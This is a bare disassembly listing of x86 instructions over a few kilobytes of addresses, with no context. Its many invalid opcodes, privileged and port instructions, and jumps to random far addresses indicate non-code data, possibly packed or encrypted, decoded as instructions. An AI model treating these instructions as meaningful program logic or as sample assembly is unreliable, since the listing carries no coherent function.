  408fa0:	and    DWORD PTR [edx+0x77],0xd7bc201f
  408fa7:	test   BYTE PTR [eax-0x2a],0xfc
  408fab:	scas   eax,DWORD PTR es:[edi]
  408fac:	aam    0x48
  408fae:	jmp    0x818ce34c
  408fb3:	je     0x409010
  408fb5:	loopne 0x408fcc
  408fb7:	add    dh,BYTE PTR [edx-0x4a612905]
  408fbd:	push   esp
  408fbe:	xlat   BYTE PTR ds:[ebx]
  408fbf:	mov    ch,0x39
  408fc1:	mov    esp,0xaa4c9fbb
  408fc6:	dec    eax
  408fc7:	and    eax,0x47b01745
  408fcc:	rol    BYTE PTR [ecx],cl
  408fce:	int3   
  408fcf:	imul   ebx,ebx,0x60
  408fd2:	imul   edi,edi,0xb
  408fd5:	inc    ecx
  408fd6:	or     DWORD PTR [edi],0x9b0c1ad6
  408fdc:	mov    ebx,0x284c419e
  408fe1:	dec    edi
  408fe2:	mov    al,ds:0x926cbdd6
  408fe7:	out    0xc9,al
  408fe9:	sub    DWORD PTR [ecx-0xe],0x36d9443e
  408ff0:	mov    edx,0x8889daf5
  408ff5:	lea    edx,[esi+0x6e]
  408ff8:	xchg   ebx,eax
  408ff9:	mov    WORD PTR [edx+eax*8-0x70],?
  408ffd:	fist   WORD PTR [eax+0x34690988]
  409003:	cmp    al,0x15
  409005:	jmp    0xcadcea7a
  40900a:	repnz fidiv DWORD PTR [edx+edx*2-0x1a]
  40900f:	stos   BYTE PTR es:[edi],al
  409010:	jge    0x409089
  409012:	dec    ecx
  409013:	rol    DWORD PTR [ecx+0x24],0x2c
  409017:	jmp    0x409066
  409019:	imul   esi,DWORD PTR [edx+0x1f],0x6c
  40901d:	psubq  mm0,QWORD PTR [ebx]
  409020:	int    0x47
  409022:	ds cmp eax,0xb4aa5b26
  409028:	dec    edx
  409029:	(bad)  
  40902a:	cli    
  40902b:	inc    esi
  40902c:	lea    ebp,[esi+edi*1]
  40902f:	fdivr  QWORD PTR [edx]
  409031:	loopne 0x409043
  409033:	pop    edi
  409034:	imul   esp,DWORD PTR [ecx],0x91eb544e
  40903a:	mov    ds:0xa02de64b,al
  40903f:	dec    edx
  409040:	leave  
  409041:	imul   esp,DWORD PTR [esi+0x27],0x36
  409045:	(bad)
  409048:	jg     0x408fe0
  40904a:	jne    0x409093
  40904c:	lahf   
  40904d:	mov    al,0xcc
  40904f:	mov    ds:0x4743328d,eax
  409054:	push   esp
  409055:	jp     0x408fff
  409057:	daa    
  409058:	sub    ah,cl
  40905a:	or     eax,0x16860c00
  40905f:	(bad)  
  409060:	dec    eax
  409061:	jbe    0x409020
  409063:	int    0x33
  409065:	or     BYTE PTR [edx],cl
  409067:	push   edx
  409068:	arpl   cx,bx
  40906a:	or     dl,BYTE PTR [ebx+esi*8-0x7e512d67]
  409071:	outs   dx,DWORD PTR ds:[esi]
  409072:	pusha  
  409073:	out    dx,al
  409074:	pushf  
  409075:	push   ecx
  409076:	(bad)  
  409077:	imul   ebp,DWORD PTR [edx+0x525b82e8],0xfffffff8
  40907e:	mov    dl,0xda
  409080:	add    al,ch
  409082:	test   DWORD PTR [edx-0x3e34a711],edx
  409088:	popf   
  409089:	dec    esp
  40908a:	mov    al,0x16
  40908c:	sbb    DWORD PTR [edi-0x756aea7a],ebx
  409092:	inc    ebx
  409093:	mov    edx,0xf9ab6c6b
  409098:	pop    esi
  409099:	jl     0x4090c7
  40909b:	add    cl,BYTE PTR es:[eax]
  40909e:	ss hlt 
  4090a0:	and    DWORD PTR [esi+edi*2-0x5f07b0a8],edx
  4090a7:	or     al,0x76
  4090a9:	push   esp
  4090aa:	fs out 0xb2,eax
  4090ad:	push   es
  4090ae:	cmp    eax,0x1583f36f
  4090b3:	ss aaa 
  4090b5:	jnp    0x40907b
  4090b7:	jge    0x40907a
  4090b9:	jae    0x4090c1
  4090bb:	push   ecx
  4090bc:	xor    eax,0x85d8a3a4
  4090c1:	out    dx,eax
  4090c2:	mov    cl,0x31
  4090c4:	push   ecx
  4090c5:	push   cs
  4090c6:	mov    ah,0x27
  4090c8:	adc    DWORD PTR [edi-0xac38ef5],eax
  4090ce:	jno    0x409114
  4090d0:	sbb    edi,DWORD PTR [esi]
  4090d2:	xor    edx,DWORD PTR [edi-0x30b9fd41]
  4090d8:	xor    DWORD PTR [edx],0x5e
  4090db:	mov    ecx,0x1901e6cc
  4090e0:	aas    
  4090e1:	aas    
  4090e2:	mov    eax,ds:0x6ada1632
  4090e7:	and    eax,0xc803b81
  4090ec:	loop   0x40909a
  4090ee:	daa    
  4090ef:	mov    dl,0x8d
  4090f1:	adc    BYTE PTR [edi-0x6],dl
  4090f4:	push   esi
  4090f5:	imul   ecx,ecx,0xffffffd3
  4090f8:	js     0x409119
  4090fa:	popa   
  4090fb:	or     BYTE PTR [edx],ch
  4090fd:	(bad)  
  4090fe:	fistp  QWORD PTR [eax+0x30]
  409101:	cli    
  409102:	mov    edx,eax
  409104:	mov    ebp,0x2336a75
  409109:	test   BYTE PTR [edi+0x76],dl
  40910c:	retf   
  40910d:	sub    ch,bh
  40910f:	sub    ebx,edx
  409111:	imul   ecx,DWORD PTR [eax],0x2e
  409114:	inc    ebx
  409115:	mov    bh,0xbc
  409117:	push   es
  409118:	test   BYTE PTR [ecx],dl
  40911a:	inc    ebx
  40911b:	sub    eax,DWORD PTR [ecx]
  40911d:	fidiv  WORD PTR [esi]
  40911f:	mov    ecx,?
  409121:	mov    bl,0x4c
  409123:	mov    al,ds:0xa6009cc4
  409128:	xchg   ebx,eax
  409129:	mov    WORD PTR [esi],?
  40912b:	inc    ebx
  40912c:	xlat   BYTE PTR ds:[ebx]
  40912d:	ds mov eax,0xbe682358
  409133:	mov    al,ds:0xfb44df9b
  409138:	sub    al,0xdb
  40913a:	xchg   BYTE PTR [ebx+0x3e],bh
  40913d:	cld    
  40913e:	test   ecx,ecx
  409140:	test   eax,0x789cfaea
  409145:	push   es
  409146:	shl    DWORD PTR [edi-0x9],cl
  409149:	mov    ah,0xac
  40914b:	lds    esp,FWORD PTR [ecx-0x2abad1e8]
  409151:	adc    bl,BYTE PTR [ebx]
  409153:	mov    edi,0x501f10e0
  409158:	repz icebp 
  40915a:	xor    eax,0x3cf5bf5
  40915f:	push   edx
  409160:	or     DWORD PTR ds:0xb8c81cf0,0x6cbe1cc7
  40916a:	adc    dl,BYTE PTR [ebx+0x1431f64f]
  409170:	mov    eax,ds:0xa1cffa7c
  409175:	add    ch,BYTE PTR [esi]
  409177:	adc    eax,0xe279252
  40917c:	out    dx,al
  40917d:	adc    al,0x82
  40917f:	sbb    eax,0x212c2233
  409184:	mov    edx,0x59f9683b
  409189:	mov    edx,0xd3a2797c
  40918e:	sti    
  40918f:	mov    ch,0xca
  409191:	jg     0x4091fa
  409193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409194:	xchg   BYTE PTR ds:[ecx],bl
  409197:	ss push esi
  409199:	fcmovb st,st(5)
  40919b:	loop   0x4091ef
  40919d:	add    ah,ah
  40919f:	daa    
  4091a0:	jmp    0x40913c
  4091a2:	ret    0xe341
  4091a5:	adc    DWORD PTR [ecx-0x74e745e5],esp
  4091ab:	ret    0x802d
  4091ae:	jle    0x4091d2
  4091b0:	pop    ss
  4091b1:	mov    ds:0x97cbb2a,al
  4091b6:	dec    esi
  4091b7:	retf   
  4091b8:	stos   DWORD PTR es:[edi],eax
  4091b9:	test   eax,0x23bd9ebe
  4091be:	sub    DWORD PTR [esi+ebx*8],esp
  4091c1:	ins    BYTE PTR es:[edi],dx
  4091c2:	out    0x92,al
  4091c4:	jl     0x409208
  4091c6:	cmp    BYTE PTR [ecx],ch
  4091c8:	jmp    0xb8764848
  4091cd:	int    0x88
  4091cf:	or     BYTE PTR [esi-0x39406176],0xf0
  4091d6:	fld    DWORD PTR [ecx-0x5e]
  4091d9:	in     al,0xd3
  4091db:	or     eax,0x10ff10d1
  4091e0:	sub    al,0x7f
  4091e2:	cmp    ah,al
  4091e4:	and    eax,0x61859bc9
  4091e9:	repz xchg cl,dl
  4091ec:	call   0xb78:0xddedcd41
  4091f3:	dec    ecx
  4091f4:	out    dx,al
  4091f5:	xchg   esi,eax
  4091f6:	lods   al,BYTE PTR ds:[esi]
  4091f7:	sbb    al,0x44
  4091f9:	fmul   QWORD PTR [esi+0x739ba0b0]
  4091ff:	test   eax,0x1ee4ad20
  409204:	xchg   DWORD PTR [ecx-0x77],ecx
  409207:	sahf   
  409208:	cwde   
  409209:	pop    edi
  40920a:	test   al,0x2a
  40920c:	in     eax,dx
  40920d:	xchg   ebp,eax
  40920e:	hlt    
  40920f:	sub    esi,esp
  409211:	cwde   
  409212:	sub    ecx,DWORD PTR [ecx-0x52bea530]
  409218:	fmul   DWORD PTR [edx+eiz*2]
  40921b:	sub    al,0xbe
  40921d:	test   al,0x93
  40921f:	shr    DWORD PTR [edx-0x28],cl
  409222:	sar    DWORD PTR ds:[ebx-0xcfe0b14],0x82
  40922a:	sbb    al,bl
  40922c:	mov    dl,0x5a
  40922e:	daa    
  40922f:	cmc    
  409230:	ins    BYTE PTR es:[edi],dx
  409231:	sbb    al,0xb3
  409233:	imul   edx,DWORD PTR [esi+0x3f516ac5],0xffffffd5
  40923a:	mov    edi,0x374679b1
  40923f:	xor    cl,BYTE PTR [eax-0x3e]
  409242:	mov    ch,0xd
  409244:	mov    ds:0x723f95ec,al
  409249:	sub    esi,DWORD PTR [edx+ecx*8]
  40924c:	fsubr  DWORD PTR [edi-0x66ae02e9]
  409252:	jmp    0xd722:0xdb6a0853
  409259:	push   esp
  40925a:	dec    ecx
  40925b:	ror    BYTE PTR [edx-0x604cb674],0x85
  409262:	retf   
  409263:	out    0x5,al
  409265:	add    dh,ch
  409267:	out    0xa1,eax
  409269:	popa   
  40926a:	add    eax,eax
  40926c:	je     0x409208
  40926e:	cmp    bl,dl
  409270:	mov    esi,0x35e62afa
  409275:	iret   
  409276:	push   cs
  409277:	pop    edi
  409278:	out    0xe3,al
  40927a:	daa    
  40927b:	cld    
  40927c:	and    DWORD PTR [edx+0x50],0xffffffdc
  409280:	not    BYTE PTR [ecx-0x6b]
  409283:	frstor [ebx+0x272f88ce]
  409289:	cmp    ecx,esp
  40928b:	jbe    0x40925e
  40928d:	jbe    0x4092f1
  40928f:	pop    esp
  409290:	sub    eax,0x3fa70dd1
  409295:	add    eax,edx
  409297:	das    
  409298:	jecxz  0x4092e8
  40929a:	pusha  
  40929b:	lods   eax,DWORD PTR ds:[esi]
  40929c:	out    dx,al
  40929d:	dec    ebp
  40929e:	or     al,0x5e
  4092a0:	mov    ebp,0x59e3cb7d
  4092a5:	push   esi
  4092a6:	inc    eax
  4092a7:	aam    0x99
  4092a9:	inc    eax
  4092aa:	xchg   ebx,eax
  4092ab:	mov    ds:0x796c29f3,eax
  4092b0:	call   0x47e3:0x83f4171c
  4092b7:	sbb    DWORD PTR [ebx+0x74],eax
  4092ba:	outs   dx,BYTE PTR ds:[esi]
  4092bb:	fcmovnbe st,st(1)
  4092bd:	pusha  
  4092be:	fmul   st(1),st
  4092c0:	add    BYTE PTR [ebp-0xb4b6810],0xe5
  4092c7:	add    DWORD PTR [ecx+0x50],0xa0bf962b
  4092ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092cf:	xchg   ebp,eax
  4092d0:	repnz pushf 
  4092d2:	ins    BYTE PTR es:[edi],dx
  4092d3:	mov    al,0x43
  4092d5:	pop    ds
  4092d6:	and    al,BYTE PTR [ecx]
  4092d8:	mov    gs,WORD PTR [ebx]
  4092da:	dec    ecx
  4092db:	xor    DWORD PTR [edi],0x1c
  4092de:	or     DWORD PTR [ebx],esi
  4092e0:	push   ss
  4092e1:	dec    edi
  4092e2:	sbb    BYTE PTR [ebp-0x7d085d99],0x73
  4092e9:	or     edi,edi
  4092eb:	ja     0x4092cf
  4092ed:	fisttp QWORD PTR [edi+0x5d]
  4092f0:	xlat   BYTE PTR ds:[ebx]
  4092f1:	sbb    esp,DWORD PTR [edi+0x4d]
  4092f4:	mov    edi,0xe93536a7
  4092f9:	int3   
  4092fa:	ret    
  4092fb:	dec    edx
  4092fc:	sub    al,0xff
  4092fe:	xor    eax,0x184fe290
  409303:	xlat   BYTE PTR ds:[ebx]
  409304:	add    eax,0x99caa7bf
  409309:	in     al,dx
  40930a:	lods   al,BYTE PTR ds:[esi]
  40930b:	inc    eax
  40930c:	scas   al,BYTE PTR es:[edi]
  40930d:	sbb    BYTE PTR [ecx+0x1f],ch
  409310:	sbb    esp,DWORD PTR [ecx+0x18]
  409313:	xor    eax,0x8a5f4a95
  409318:	cdq    
  409319:	xchg   esp,eax
  40931a:	inc    edx
  40931b:	dec    eax
  40931c:	add    eax,0x6dbec13b
  409321:	retf   
  409322:	leave  
  409323:	(bad)  
  409324:	aas    
  409325:	out    0x6d,al
  409327:	pop    ebp
  409328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409329:	sbb    cl,BYTE PTR [esi-0x5600ce93]
  40932f:	mov    ebx,0x74036c35
  409334:	ins    DWORD PTR es:[edi],dx
  409335:	cmp    al,0x25
  409337:	sub    DWORD PTR [ebp-0x2b],edx
  40933a:	(bad)  
  40933b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40933c:	fs jno 0x409356
  40933f:	jne    0x4092dd
  409341:	pminub mm7,QWORD PTR [edx-0x73ea61ed]
  409348:	add    BYTE PTR [ebp-0x6c],0xf0
  40934c:	jno    0x4093b9
  40934e:	mov    ecx,0xd61f921c
  409353:	shr    ch,cl
  409355:	dec    ebx
  409356:	pop    eax
  409357:	dec    eax
  409358:	(bad)  
  409359:	push   eax
  40935a:	test   BYTE PTR [edi+0x7b06f23b],0x2a
  409361:	fist   WORD PTR [ecx-0x26]
  409364:	jg     0x40937d
  409366:	out    dx,eax
  409367:	cmp    esp,DWORD PTR [edx-0x7b398a8a]
  40936d:	test   cl,0x3a
  409370:	cwde   
  409371:	jne    0x409342
  409373:	gs add bl,BYTE PTR cs:[ecx]
  409377:	adc    al,0x6b
  409379:	jl     0x40930f
  40937b:	dec    ebp
  40937c:	punpckldq mm3,DWORD PTR [ebx+edx*4+0x562da74a]
  409384:	rol    bl,1
  409386:	push   ecx
  409387:	clc    
  409388:	push   ebp
  409389:	popf   
  40938a:	ret    
  40938b:	cmp    eax,0x20b1b625
  409390:	call   0x42d8f7c0
  409395:	das    
  409396:	cmp    DWORD PTR [esi-0x1d],ebp
  409399:	jae    0x40938e
  40939b:	addr16 sahf 
  40939d:	inc    ebp
  40939e:	dec    edx
  40939f:	jle    0x4093ac
  4093a1:	inc    ebx
  4093a2:	mov    ds:0x948aa8f6,eax
  4093a7:	ja     0x4093da
  4093a9:	mov    al,0xf2
  4093ab:	adc    esi,DWORD PTR [ebp+0x4c]
  4093ae:	jmp    eax
  4093b0:	cld    
  4093b1:	imul   ebp,edi,0x2d1e9c45
  4093b7:	push   edx
  4093b8:	cdq    
  4093b9:	mov    al,0xa3
  4093bb:	test   al,0xc3
  4093bd:	push   esi
  4093be:	cmp    eax,0x6e702fa
  4093c3:	sbb    ah,BYTE PTR [ebx-0x5b57fea3]
  4093c9:	pop    ecx
  4093ca:	das    
  4093cb:	sub    eax,0xe873db7a
  4093d0:	test   DWORD PTR [esp+eax*1+0x95abe94],esp
  4093d7:	lods   al,BYTE PTR ds:[esi]
  4093d8:	and    esp,esp
  4093da:	test   al,0x1e
  4093dc:	and    ecx,DWORD PTR [ebx-0x230327b6]
  4093e2:	cld    
  4093e3:	add    esi,DWORD PTR [eax+0x70f0f4a3]
  4093e9:	inc    esp
  4093ea:	aas    
  4093eb:	dec    edx
  4093ec:	push   edx
  4093ed:	(bad)  
  4093ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ef:	cmp    esi,DWORD PTR [esi]
  4093f1:	sub    bh,BYTE PTR [ebp-0x38]
  4093f4:	mov    al,0xe7
  4093f6:	mov    al,ds:0xb090dc43
  4093fb:	shl    BYTE PTR [ebx+0x41773b32],1
  409401:	hlt    
  409402:	jecxz  0x40941b
  409404:	pop    esi
  409405:	jnp    0x40940e
  409407:	pop    eax
  409408:	ins    BYTE PTR es:[edi],dx
  409409:	or     ebx,edx
  40940b:	push   cs
  40940c:	sbb    al,0xd9
  40940e:	(bad)
  409412:	and    BYTE PTR [eax-0x6ce2fcf4],ah
  409418:	and    eax,0xd90ec616
  40941d:	popa   
  40941e:	add    bl,BYTE PTR [edi+0x7]
  409421:	test   DWORD PTR [ecx+0x61],edx
  409424:	(bad)  
  409425:	call   0xc8aa:0x62c48461
  40942c:	mov    bh,0xea
  40942e:	pop    esp
  40942f:	xchg   ebx,eax
  409430:	repz stc 
  409432:	pop    esp
  409433:	ret    0x8af4
  409436:	jo     0x4093ba
  409438:	mov    ds:0x474ded43,eax
  40943d:	xchg   dh,cl
  40943f:	or     edi,DWORD PTR [edx]
  409441:	pop    edi
  409442:	pop    ds
  409443:	mov    ds:0x98a03d86,eax
  409448:	cs rol esp,1
  40944b:	pop    es
  40944c:	adc    edx,ecx
  40944e:	jle    0x409443
  409450:	and    eax,0xbb1179ff
  409455:	sti    
  409456:	out    dx,eax
  409457:	retf   
  409458:	xchg   edi,eax
  409459:	sub    ah,BYTE PTR [ebx]
  40945b:	pop    eax
  40945c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40945d:	xor    edx,eax
  40945f:	jne    0x409421
  409461:	imul   eax,DWORD PTR [edx-0xef7cd59],0xffffffe8
  409468:	pushf  
  409469:	xchg   ecx,eax
  40946a:	ret    0xf897
  40946d:	sub    DWORD PTR [ebp-0x47],esi
  409470:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409472:	and    BYTE PTR [ecx+0x4e2a4a87],dl
  409478:	push   edx
  409479:	js     0x409444
  40947b:	and    BYTE PTR [edx],0xbb
  40947e:	push   0x8f8630a2
  409483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409484:	sbb    BYTE PTR [edx+edi*8-0x615fc0fb],0x34
  40948c:	push   esi
  40948e:	call   0x8261:0x31e3a82a
  409495:	hlt    
  409496:	test   eax,0xbfea6ba8
  40949b:	push   eax
  40949c:	lods   al,BYTE PTR ds:[esi]
  40949d:	and    DWORD PTR [edx],ebp
  40949f:	xor    cl,ch
  4094a1:	cdq    
  4094a2:	xlat   BYTE PTR ds:[ebx]
  4094a3:	ret    0xfcf3
  4094a6:	cdq    
  4094a7:	not    DWORD PTR [ecx-0x679745ff]
  4094ad:	xor    esi,esp
  4094af:	xchg   edx,eax
  4094b0:	inc    edx
  4094b1:	xchg   BYTE PTR [ebx-0x737c8382],ch
  4094b7:	dec    esi
  4094b8:	das    
  4094b9:	mov    db2,edx
  4094bc:	xor    al,0x93
  4094be:	es pop edi
  4094c0:	retf   0x7545
  4094c3:	mov    ds:0x2488448a,al
  4094c8:	pop    esi
  4094c9:	push   0x9162115b
  4094ce:	repnz mov dh,0x99
  4094d1:	jnp    0x4094db
  4094d3:	and    al,0xd7
  4094d5:	loope  0x40951b
  4094d7:	mov    ds:0xd0dd8c18,eax
  4094dc:	cld    
  4094dd:	leave  
  4094de:	cmp    ah,ch
  4094e0:	les    esi,FWORD PTR [ecx+0x1addf3cd]
  4094e6:	fst    st(6)
  4094e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094e9:	and    al,0x3c
  4094eb:	jo     0x4094ad
  4094ed:	dec    esp
  4094ee:	mov    eax,0x236cdd4f
  4094f3:	sub    esp,DWORD PTR [ecx]
  4094f5:	jp     0x409482
  4094f7:	push   edi
  4094f8:	pop    ebp
  4094f9:	mov    ecx,DWORD PTR [ebx-0x3]
  4094fc:	test   BYTE PTR [ebx+ebx*4],0x36
  409500:	repnz inc esp
  409502:	das    
  409503:	dec    ecx
  409504:	xchg   edx,eax
  409505:	(bad)  
  409506:	xchg   edx,eax
  409507:	cmp    esp,DWORD PTR [edx]
  409509:	leave  
  40950a:	mov    ds:0x630319e7,al
  40950f:	int    0xd0
  409511:	push   ecx
  409512:	add    cl,0x5
  409515:	test   BYTE PTR [edi+0x20],0xc6
  409519:	xchg   esi,eax
  40951a:	fiadd  WORD PTR [ebx]
  40951c:	inc    ecx
  40951d:	mov    cl,0xec
  40951f:	les    edi,FWORD PTR [edi+0x52c0edd4]
  409525:	loopne 0x4094e8
  409527:	cmp    DWORD PTR [eax-0x1c],edx
  40952a:	aaa    
  40952b:	xchg   esi,eax
  40952c:	out    0x62,eax
  40952e:	or     ah,BYTE PTR [esi-0xc]
  409531:	pop    ss
  409532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409533:	push   ss
  409534:	addr16 inc esp
  409536:	cmp    al,0x4b
  409538:	xor    esi,DWORD PTR [ecx-0x35]
  40953b:	cdq    
  40953c:	pop    ecx
  40953d:	data16 (bad) [esi+0x2f]
  409541:	cmp    BYTE PTR [eax+0x389cba25],dl
  409547:	out    0x44,al
  409549:	repnz int 0xa2
  40954c:	add    ebp,DWORD PTR [esi+0x12]
  40954f:	push   es
  409550:	iret   
  409551:	mov    ah,BYTE PTR [eax+0xf]
  409554:	test   BYTE PTR [edx+0x4b002cd4],ah
  40955a:	pop    ds
  40955b:	in     eax,0x54
  40955d:	mov    ch,0x54
  40955f:	nop
  409560:	sub    ch,BYTE PTR [edx-0xb0c2c8a]
  409566:	push   ebx
  409567:	out    dx,al
  409568:	cmp    dl,dl
  40956a:	scas   al,BYTE PTR es:[edi]
  40956b:	scas   al,BYTE PTR es:[edi]
  40956c:	add    BYTE PTR [ecx+0x59],0x0
  409570:	mov    cl,0x4c
  409572:	(bad)  
  409573:	xchg   edx,eax
  409574:	push   0xc2eff8e3
  409579:	int    0xc4
  40957b:	or     al,0xd7
  40957d:	je     0x40951c
  40957f:	pop    ss
  409580:	in     eax,dx
  409581:	popf   
  409582:	pop    ebp
  409583:	pop    edx
  409584:	cmp    bh,cl
  409586:	pop    esp
  409587:	pop    ebp
  409588:	push   0x3a2f9208
  40958d:	mov    edi,0x9e38a0c4
  409592:	mov    edi,ss
  409594:	cmp    DWORD PTR [esi+0x43],esi
  409597:	dec    ebx
  409598:	pop    es
  409599:	xor    eax,0x96580d1f
  40959e:	in     eax,dx
  40959f:	cli    
  4095a0:	xchg   esp,eax
  4095a1:	sbb    ecx,DWORD PTR [edi-0x4150d44b]
  4095a7:	stos   BYTE PTR es:[edi],al
  4095a8:	jo     0x40959d
  4095aa:	mov    ebp,0x5136d3b8
  4095af:	sbb    DWORD PTR [di],esi
  4095b2:	out    dx,eax
  4095b3:	les    esi,FWORD PTR [ebx+0x31]
  4095b6:	test   BYTE PTR [ecx+0x65],ch
  4095b9:	les    edx,FWORD PTR [ebx+0x18]
  4095bc:	ficom  DWORD PTR [edi-0x3eb0637]
  4095c2:	and    edx,DWORD PTR [ecx-0x5b1b5dfb]
  4095c8:	mov    bl,0xc3
  4095ca:	mov    BYTE PTR [ecx-0x1a],ah
  4095cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095ce:	lea    eax,[ebx+0x29]
  4095d1:	loope  0x4095ce
  4095d3:	push   cs
  4095d4:	mov    dl,0x24
  4095d6:	inc    edx
  4095d7:	mov    ch,0x39
  4095d9:	pop    ds
  4095da:	push   esp
  4095db:	pop    eax
  4095dc:	or     BYTE PTR [edi],al
  4095de:	repnz push ds
  4095e0:	sti    
  4095e1:	mov    bh,0x44
  4095e3:	in     al,0x57
  4095e5:	pop    ds
  4095e6:	fmul   st,st(4)
  4095e8:	daa    
  4095e9:	(bad)  
  4095ea:	cmc    
  4095eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095ec:	ins    BYTE PTR es:[edi],dx
  4095ed:	and    al,0x77
  4095ef:	adc    eax,0xd5d4000f
  4095f4:	mov    bl,0xb7
  4095f6:	in     eax,dx
  4095f7:	mov    BYTE PTR [ebp+0x78],bl
  4095fa:	(bad)  
  4095fb:	xor    eax,0x6fd2a260
  409600:	loopne 0x409587
  409602:	or     eax,0x9056fb56
  409607:	xchg   esi,eax
  409608:	push   ecx
  409609:	pop    ecx
  40960a:	lods   al,BYTE PTR ds:[esi]
  40960b:	out    0xd7,al
  40960d:	inc    esi
  40960e:	stos   DWORD PTR es:[edi],eax
  40960f:	fnsave [ebx+0x63c01594]
  409615:	push   ebp
  409616:	jecxz  0x4095d5
  409618:	jae    0x4095a5
  40961a:	fcomp  DWORD PTR [ebp+0x59]
  40961d:	jmp    0x409635
  40961f:	int3   
  409620:	cld    
  409621:	ucomiss xmm7,DWORD PTR es:[edi+0xd]
  409626:	ror    DWORD PTR [ebp+0x46c7913e],0x75
  40962d:	dec    eax
  40962e:	cld    
  40962f:	test   DWORD PTR [eax-0x66],0xce2f1385
  409636:	and    bl,bl
  409638:	lods   al,BYTE PTR ds:[esi]
  409639:	inc    ebx
  40963a:	xor    dh,BYTE PTR [esi-0x35]
  40963d:	lods   al,BYTE PTR ds:[esi]
  40963e:	dec    edx
  40963f:	fst    DWORD PTR [ebp+0x7c]
  409642:	add    cl,cl
  409644:	(bad)  
  409645:	ja     0x409615
  409647:	mov    al,0x14
  409649:	cmp    DWORD PTR [esi-0x5c],edi
  40964c:	adc    DWORD PTR [edi-0x72],ebp
  40964f:	push   ds
  409650:	mov    bl,0x64
  409652:	jb     0x40961f
  409654:	sub    eax,0x9de1ce68
  409659:	div    BYTE PTR ds:0xb1ccd7d
  40965f:	sbb    DWORD PTR [edi],esi
  409661:	jne    0x40968c
  409663:	loop   0x409638
  409665:	(bad)  
  409666:	pop    ebp
  409667:	jmp    0x60606158
  40966c:	or     dh,BYTE PTR [esi+0x3]
  40966f:	mov    al,0xa9
  409671:	inc    edi
  409672:	cld    
  409673:	retf   0x4745
  409676:	ja     0x4096df
  409678:	hlt    
  409679:	cmp    dh,0x17
  40967c:	mov    bh,0x8b
  40967e:	jmp    0xb0dc:0x497ae0ea
  409685:	push   edx
  409686:	inc    ebx
  409687:	and    esp,DWORD PTR [ebx-0x40]
  40968a:	test   eax,0xe7b8823c
  40968f:	dec    ebx
  409690:	mov    ds:0xa60c4287,al
  409695:	xor    BYTE PTR [ebx],cl
  409697:	add    BYTE PTR [ecx-0x7df3cc74],0x62
  40969e:	ins    DWORD PTR es:[edi],dx
  40969f:	xchg   ebx,eax
  4096a0:	retf   0x356a
  4096a3:	sti    
  4096a4:	pop    esp
  4096a5:	pop    esp
  4096a6:	sub    eax,0xedb3b8c3
  4096ab:	cmc    
  4096ac:	fisubr WORD PTR [eax-0x19]
  4096af:	pop    ds
  4096b0:	add    al,0x38
  4096b2:	shl    DWORD PTR [eax+0x36],1
  4096b5:	cld    
  4096b6:	in     eax,0xbd
  4096b8:	jl     0x409714
  4096ba:	sub    eax,0x45aa53f5
  4096bf:	mov    al,0x33
  4096c1:	fild   DWORD PTR [edx]
  4096c3:	cmp    al,0x2e
  4096c5:	sbb    ch,BYTE PTR [ecx+0x45111400]
  4096cb:	(bad)  
  4096cc:	mov    al,0x6b
  4096ce:	cmp    ebx,ecx
  4096d0:	lock jo 0x409711
  4096d3:	ins    BYTE PTR es:[edi],dx
  4096d4:	cmp    dh,BYTE PTR [edx]
  4096d6:	lgdtd  [ebx-0x4ca9447d]
  4096dd:	xor    BYTE PTR [ecx-0x57],bl
  4096e0:	cs jae 0x4096cb
  4096e3:	pop    ss
  4096e4:	sbb    eax,0xe3266428
  4096e9:	addr16 jb 0x409717
  4096ec:	or     eax,0xe30f9ac7
  4096f1:	push   esp
  4096f2:	sub    BYTE PTR [ecx-0x1c67fa1f],0x92
  4096f9:	stos   DWORD PTR es:[edi],eax
  4096fa:	mov    ah,0x24
  4096fc:	fbld   TBYTE PTR [ebx-0x2efa7d2c]
  409702:	sar    ecx,1
  409704:	dec    esp
  409705:	adc    eax,0x10e6af37
  40970a:	jmp    0xd226:0x3b67f14
  409711:	mov    al,0x33
  409713:	adc    bh,BYTE PTR [edi+0x17]
  409716:	(bad)  
  409718:	jne    0x409751
  40971a:	xchg   edx,eax
  40971b:	aam    0x2f
  40971d:	push   0xffffffeb
  40971f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409720:	cmp    edx,DWORD PTR [ebx-0x70a0d02a]
  409726:	and    eax,0x8ddfced4
  40972b:	std    
  40972c:	mov    esp,0x60bded6c
  409731:	xchg   esi,eax
  409732:	push   ebx
  409733:	ins    BYTE PTR es:[edi],dx
  409734:	inc    ebp
  409735:	xchg   esp,eax
  409736:	loopne 0x409768
  409738:	mov    ch,0x37
  40973a:	sub    BYTE PTR [edx-0x4af2cd8c],cl
  409740:	inc    ebx
  409741:	stos   BYTE PTR es:[edi],al
  409742:	aam    0x8b
  409744:	push   cs
  409745:	xor    ebp,ebx
  409747:	mov    BYTE PTR [ecx-0xb],ah
  40974a:	cmp    al,BYTE PTR [esi-0x28]
  40974d:	in     eax,0x4e
  40974f:	add    DWORD PTR [eax-0x26],ebx
  409752:	sbb    dl,BYTE PTR [edi]
  409754:	pop    ebp
  409755:	add    DWORD PTR [edx+edx*8],edi
  409758:	sahf   
  409759:	jp     0x409749
  40975b:	pop    edx
  40975c:	mov    ss,WORD PTR ds:0xff359508
  409762:	push   eax
  409763:	xchg   DWORD PTR [eax+edx*4],ecx
  409766:	hlt    
  409767:	fstp   DWORD PTR [ebx]
  409769:	add    ecx,eax
  40976b:	push   ecx
  40976c:	mov    edx,0x59617459
  409771:	xchg   BYTE PTR [ecx-0x2b],ch
  409774:	sbb    bl,BYTE PTR [edx]
  409776:	xchg   edx,eax
  409777:	xor    BYTE PTR [ebp+0xd],dl
  40977a:	ins    DWORD PTR es:[edi],dx
  40977b:	pop    es
  40977c:	das    
